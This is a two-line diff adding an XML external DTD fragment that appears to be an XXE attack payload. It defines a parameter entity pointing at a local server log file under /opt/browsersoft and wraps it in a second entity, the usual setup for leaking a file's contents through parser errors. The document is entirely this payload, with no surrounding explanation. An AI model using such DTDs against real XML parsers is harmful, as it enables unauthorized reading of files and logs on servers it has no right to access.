@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/browsersoft/node/logs/node.out.2020-11-17+09-13-07">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
